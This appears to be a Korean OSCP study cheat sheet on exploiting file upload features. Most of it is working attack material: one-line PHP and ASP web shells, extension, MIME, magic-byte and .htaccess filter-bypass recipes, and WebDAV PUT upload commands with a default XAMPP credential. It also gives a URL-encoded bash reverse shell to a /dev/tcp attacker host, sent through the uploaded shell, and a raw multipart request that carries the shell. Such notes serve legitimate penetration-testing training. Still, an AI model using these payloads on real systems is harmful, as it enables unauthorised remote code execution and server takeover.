# 06_파일업로드_취약점

파일 업로드 기능이 있으면 웹셸 업로드를 시도한다. 필터를 우회해 실제 대상 서버에서 실행 가능한 파일을 업로드하는 것이 목표다. OSCP에서 매우 자주 나오는 취약점이다.

---

## 웹셸 기본

```php
# PHP 웹셸 (1줄)
<?php system($_GET['cmd']); ?>

# PHP 웹셸 (POST)
<?php system($_POST['cmd']); ?>

# PHP 웹셸 (출력 포함)
<?php echo shell_exec($_GET['cmd']); ?>

# ASP 웹셸
<% eval request("cmd") %>
```

```bash
# 업로드 후 경로 접근
http://<IP>/uploads/shell.php?cmd=id
http://<IP>/shell.php?cmd=id
```

---

## 필터 우회 기법

### 1. 이중 확장자

확장자 뒤에 다른 확장자를 덧붙인다.

```
shell.php.jpg
shell.php.png
shell.jpg.php
shell.phtml
shell.php5
shell.shtml
```

### 2. 대소문자 변환

```
shell.PHP
shell.PhP
shell.pHp
```

### 3. MIME 타입 변조 (Burp Suite)

Content-Type 헤더를 `image/jpeg` 또는 `image/png`로 변경하면 서버가 확장자로만 판단할 때 우회가 된다.

```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

### 4. 매직 바이트 추가 (콘텐츠 검증 우회)

파일 내용을 실제 이미지 형식으로 보이게 만든다.

```bash
# GIF 매직 바이트 앞에 PHP 코드 추가
# GIF89a; 를 첫 줄에 넣으면 이미지로 인식됨
cat > shell.php.gif << 'EOF'
GIF89a;
<?php system($_GET['cmd']); ?>
EOF

# PNG 매직 바이트
printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > shell.php.png
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.png

# exiftool로 Comment 필드에 PHP 코드 삽입
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php.jpg
```

### 5. .htaccess 업로드 (Apache)

```
# .htaccess 업로드를 통해 .jpg를 PHP로 실행
AddType application/x-httpd-php .jpg

# 또는 임의 확장자를 PHP로 매핑
AddType application/x-httpd-php .l33t
```

```bash
# 1단계: .htaccess 업로드
curl -F "file=@.htaccess" http://<IP>/upload.php

# 2단계: shell.jpg 업로드 (PHP 코드 포함)
curl -F "file=@shell.jpg" http://<IP>/upload.php

# 3단계: 업로드된 shell.jpg 실행
curl "http://<IP>/uploads/shell.jpg?cmd=id"
```

### 6. Null 바이트 (오래된 환경)

```
shell.php%00.jpg   # URL 인코딩
shell.php\x00.jpg  # 널 바이트
```

### 7. Windows IIS 특수 콜론

```
shell.asp;.jpg
shell.asp:.jpg
```

## WebDAV 파일 업로드

WebDAV가 활성화된 서버는 PUT 메서드로 직접 파일을 업로드할 수 있다.

```bash
# WebDAV 활성화 여부 확인
curl -X OPTIONS http://<IP>/webdav/ -v 2>&1 | grep -i "DAV\|Allow"
nmap -p 80 --script=http-webdav-scan <IP>
nikto -h http://<IP>    # WebDAV 탐지 자동화

# davtest — 한번에 여러 확장자 업로드 가능 여부 테스트
davtest -url http://<IP>/webdav/
davtest -url http://<IP>/webdav/ -auth user:pass

# cadaver — WebDAV 업로드/보기/다운로드
cadaver http://<IP>/webdav/
# dav:/webdav/> put shell.php     # 업로드
# dav:/webdav/> ls                # 목록
# dav:/webdav/> get passwd.txt    # 다운로드

# curl PUT 명령어로 직접 업로드
curl -X PUT http://<IP>/webdav/shell.php -d '<?php system($_GET["cmd"]); ?>'

# 인증 필요할 때 (기본 자격증명: wampp:xampp (XAMPP))
curl -X PUT http://<IP>/webdav/shell.php \
  -u 'user:password' \
  -d '<?php system($_GET["cmd"]); ?>'
```

## 업로드 후 실행 확인

```bash
# 업로드된 경로로 접근 (디렉토리를 미리 열거해 두어야 함)
http://<IP>/uploads/shell.php?cmd=id
http://<IP>/files/shell.php?cmd=whoami
http://<IP>/upload/shell.php?cmd=id

# 실행 후 리버스 셸로 업그레이드
http://<IP>/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<칼리IP>/4444+0>%261'

# URL 인코딩 필요
# & → %26
# space → + 또는 %20
```

## 팁

```
파일 업로드 발견 → 확장자 필터 확인
  → 필터 없으면 직접 shell.php 업로드
  → 확장자만 필터링: 이중 확장자 / 대소문자 시도
  → MIME 타입만 확인: Content-Type 변조 시도
  → 콘텐츠 검증: 매직 바이트 추가 또는 exiftool
  → Apache: .htaccess 업로드 시도
  → 모두 실패시 WebDAV PUT 메서드 확인
```

## multipart/form-data 원본 구조 이해 + 수동 조작 방법론

파일 업로드 폼은 브라우저가 자동으로 이 형식을 만들어서 보낸다. 실제 조작은 이 원본 형식을 그대로 두고 딱 두 군데(파일명, 파일 내용)만 손대는 것이다.

```
POST /upload.php HTTP/1.1
Host: <IP>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXXXX
Content-Length: <자동계산>

------WebKitFormBoundaryXXXX
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryXXXX
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundaryXXXX--
```

- `boundary=`: 각 파트를 구분하는 임의 문자열 (실제 파일 내용에 안 나올 랜덤 값)
- `--boundary값`: 파트 시작 표시, 맨 끝은 `--boundary값--`로 마감
- `filename="shell.php"`: 확장자를 실행 가능한 형태로 유지하는 게 핵심
- `Content-Type: image/png`: 서버가 이 값만 보고 검증할 때 속이는 지점 — 실제 파일 확장자와 무관하게 값만 바꾸면 됨

### 권장 작업 순서 (감으로 짜지 말고 실제 요청을 보고 베낄 것)

1. Burp Intercept 켜고, **정상적인 이미지 파일로 진짜 업로드를 한 번 해본다**
2. Burp가 잡은 그 요청을 보고 실제 브라우저가 만든 boundary/필드 구조를 확인한다
3. 그 구조에서 `filename`과 파일 내용(바이너리 부분)**만** 웹쉘로 교체한다
4. `Content-Type`은 원래 있던 `image/png` 등을 그대로 유지한다 (서버 검증 우회 포인트)
5. Content-Length는 Burp Repeater가 자동 재계산하므로 수동으로 안 맞춰도 됨

이 방식이 처음부터 형식을 암기해서 손으로 짜는 것보다 훨씬 안전하고 빠르다 — RFC 7578에 정의된 표준 형식이라 브라우저마다 세부 문법이 똑같다.
